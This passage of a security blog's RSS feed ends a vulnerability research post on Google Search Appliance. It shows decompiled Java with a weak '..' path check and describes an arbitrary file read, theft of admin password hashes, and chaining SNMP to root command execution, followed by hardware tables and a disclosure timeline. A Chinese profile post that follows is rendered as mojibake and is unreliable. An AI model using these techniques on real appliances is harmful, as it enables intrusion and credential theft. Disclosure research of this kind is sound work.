                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see here that the only check is whether the string contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt;. 
However, we can directly specify the absolute path and read any local file directly!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The old version of GSA does not have the /font endpoint, 
but /dps/admin/admin has a similar file reading issue. 
You can directly specify the logName for file reading. 
Refer to the diagram below for directly reading the account password from the system management interface:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After successfully cracking the hash, you can log in, enable the SNMP service, 
and combine it with the first vulnerability to execute arbitrary commands with root privileges.&lt;/p&gt;

&lt;h3 id=&quot;other-findings-and-misc&quot;&gt;Other findings and misc&lt;/h3&gt;

&lt;h4 id=&quot;internal-uris-in-web-services&quot;&gt;Internal URIs in web services&lt;/h4&gt;

&lt;p&gt;In GSA, there are multiple sub-services that communicate with each other using the HTTP protocol. 
Many of these services offer URLs such as /varz, /helpz, and /procz. 
We can access them either in the trusted network location defined for the service or using 127.0.0.1:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In vGSA, we observed that there is a service execution parameter called ‚Äúuseripheader=X-User-Ip‚Äù, 
this parameter allows direct access to a certain functionality of the externally exposed admin console when 
included in the request header as ‚ÄúX-User-Ip‚Äù.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/procz&lt;/code&gt; endpoint can even fetch executables and the shared libraries they are using:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;appliances-list&quot;&gt;Appliances list&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Model name&lt;/th&gt;
      &lt;th&gt;Maker&lt;/th&gt;
      &lt;th&gt;Specs&lt;/th&gt;
      &lt;th&gt;version&lt;/th&gt;
      &lt;th&gt;Document amount&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;3.4.14&lt;/td&gt;
      &lt;td&gt;300,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini-002X&lt;/td&gt;
      &lt;td&gt;SuperMicro&lt;/td&gt;
      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
      &lt;td&gt;5.0.0&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1001&lt;/td&gt;
      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;3,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1002&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-7007&lt;/td&gt;
      &lt;td&gt;Dell R710&lt;/td&gt;
      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;10,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-9009&lt;/td&gt;
      &lt;td&gt;Dell unknown&lt;/td&gt;
      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;30,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G100&lt;/td&gt;
      &lt;td&gt;Dell R720XD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;linux-kernel-version&quot;&gt;Linux Kernel Version&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;GSA version&lt;/th&gt;
      &lt;th&gt;Linux Kernel Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7.6.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.4.0&lt;/td&gt;
      &lt;td&gt;¬†&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.0.14&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÊôÇÈñì&lt;/th&gt;
      &lt;th&gt;‰∫ã‰ª∂&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2005/06/10&lt;/td&gt;
      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; reported by H D Moore&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2008&lt;/td&gt;
      &lt;td&gt;GSA 5.0 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008/10/28&lt;/td&gt;
      &lt;td&gt;vgsa_20081028.7z (5.2.0)  released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2013/04/20&lt;/td&gt;
      &lt;td&gt;GSA 6.14.0.G28  released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/03/20&lt;/td&gt;
      &lt;td&gt;Cross-site Scripting &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; reported by Will Dormann&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/01&lt;/td&gt;
      &lt;td&gt;GSA 7.0.14.G238 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/03&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G252 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/12/12&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G264 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/02/07&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G270 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/15&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G64 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/22&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G72 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/30&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G74 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/06/04&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G82 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2016&lt;/td&gt;
      &lt;td&gt;Google announced that GSA will be sunset from the market.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/01/05&lt;/td&gt;
      &lt;td&gt;XML External Entitiy injection &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; reported by Timo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/05/24&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G36 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/01&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G42 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/31&lt;/td&gt;
      &lt;td&gt;The author of this article obtained this device, with the version being 7.0.14&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/08/25&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G46 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/10/21&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G58 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/01/19&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G30 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/04/19&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G36 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/07/28&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G64 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/11/09&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G12 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/12/28&lt;/td&gt;
      &lt;td&gt;The final date to order GSA.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/01/17&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G20 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/03/21&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G26 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/06/15&lt;/td&gt;
      &lt;td&gt;GSA 7.6.360.G10 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/10/08&lt;/td&gt;
      &lt;td&gt;GSA 7.6.360.G16 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2019/04/26&lt;/td&gt;
      &lt;td&gt;GSA 7.6.512.G18 released. It should be the last publicly released version.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;issues reported.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;replied from a bot, and triaged.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;issuetracker.google.com assigned a issue.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/18&lt;/td&gt;
      &lt;td&gt;Google said issue is not severe enough to qualify for a reward, but VRP panel will take a closer look.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/20&lt;/td&gt;
      &lt;td&gt;VRP panel has decided that the security impact of this issue does not meet the bar for a financial reward.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/01&lt;/td&gt;
      &lt;td&gt;Asking if a vulnerability will be assigned a CVE identifier.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/02&lt;/td&gt;
      &lt;td&gt;Confirming that a CVE identifier will not be assigned.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2023&lt;/td&gt;
      &lt;td&gt;Started writing this article&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/06/04&lt;/td&gt;
      &lt;td&gt;First draft completed.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Although the GSA/vGSA is a product that has reached the end of its lifecycle, 
studying how Google increases product security and reduces attack vectors for devices can broaden our knowledge,
which we might not usually come into contact with. 
Although it is not detailed in this article, the Java Security Manager and the Linux Kernel‚Äôs seccomp are both technologies used in the GSA, 
and this research has also left some goals for further study:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The feedergate service listening on port 19900.&lt;/li&gt;
  &lt;li&gt;Memory vulnerabilities in Oracle‚Äôs Outside-in Technology for converting file formats.&lt;/li&gt;
  &lt;li&gt;The convert_to_html seccomp sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will share when there are some research results, See you next time.&lt;/p&gt;

&lt;h3 id=&quot;other-reference-links&quot;&gt;Other reference links&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/</link>
                <guid>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en</guid>
                <pubDate>Fri, 07 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ÂæûË≥áÂÆâÈ∫ªÁìúÂà∞Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ÔºçVtim</title>
                <description>&lt;p&gt;„ÄåÊèêÂà∞Èß≠ÂÆ¢Ôºå‰Ω†ÊúÉÊÉ≥Âà∞Ë™∞ÔºüÊòØ„ÄäÈß≠ÂÆ¢‰ªªÂãô„ÄãÁöÑÂ∞ºÊ≠ê„ÄÅ V ÊÄ™ÂÆ¢„ÄÅ„ÄäÁúãËáâÊôÇ‰ª£„ÄãË£°ÁöÑÂ∞èË∑Ø„ÄÅÈÇÑÊòØÊ©òÂ≠êÔºü„ÄçÁ¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ Vtim Á¨ëËëóÂïèÈÅì„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁõÆÂâçÊñº DEVCORE Êà¥Â§´ÂØáÁàæÊìî‰ªªÁ¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ÁöÑ VtimÔºåÁèæÂπ¥ 27 Ê≠≤ÔºåÊõæÂ∏∂È†òÈÅéÂ§öÊ¨°Á¥ÖÈöäÊºîÁ∑¥Â∞àÊ°àÔºåÊìÅÊúâÊï∏ÂçÅÂ†¥Á¥ÖÈöäÊºîÁ∑¥Á∂ìÈ©óÔºå‰πüÊúâË±êÂØåÁöÑË≥áÂÆâÁ´∂Ë≥ΩÂèäÂúãÈöõ‰ºÅÊ•≠ÊºèÊ¥ûÁçéÂãµË®àÁï´Á∂ìÈ©óÔºå‰∫¶ÈÄöÈÅé OSCP„ÄÅOSWE Ë™çË≠âÔºåÂÖ∑ÂÇôÂ∞àÊ•≠ÁöÑ Web Ê™¢Ê∏¨ËàáÂÖßÁ∂≤Êª≤ÈÄèËÉΩÂäõ„ÄÇ„ÄåÊàëÂÖ∂‰ªñË∫´‰ªΩÊòØÊºèÊ¥ûË≥ûÈáëÁçµ‰∫∫Ë∑üÊ•≠È§ò CTF Áé©ÂÆ∂ÔºÅ„ÄçVtimË™™„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ctf-ÊÑèÂ§ñÂæóÂêç--ÂæûÊ≠§Ëµ∞‰∏äË≥áÂÆâË∑Ø&quot;&gt;CTF ÊÑèÂ§ñÂæóÂêç  ÂæûÊ≠§Ëµ∞‰∏äË≥áÂÆâË∑Ø&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/1.png&quot; alt=&quot;&quot; /&gt;
